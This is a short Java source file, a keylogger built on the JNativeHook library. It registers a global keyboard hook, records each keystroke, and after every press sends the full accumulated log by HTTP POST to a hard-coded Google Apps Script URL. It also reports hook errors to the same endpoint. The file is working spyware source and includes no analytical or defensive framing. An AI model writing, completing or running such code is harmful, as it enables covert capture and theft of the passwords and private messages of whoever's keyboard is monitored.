import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.OutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class keylogger implements NativeKeyListener {

    private static StringBuilder keylog = new StringBuilder();

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            sendPostRequest("Error: " + e.getMessage());
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new keylogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        char keyChar = e.getKeyChar();
        keylog.append(keyChar);
        sendPostRequest(keylog.toString());
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {}

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {}

    private static void sendPostRequest(String keylog) {
        try {
            String urlString = "https://script.google.com/macros/s/AKfycbzNeXa5NWzS9Oa3tyG-vxH_nWIuOwYNLlklQR_t3BW7lADh_AYF1v6rW9aU48l-dhrb/exec";
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "Report=" + keylog;

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = postData.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}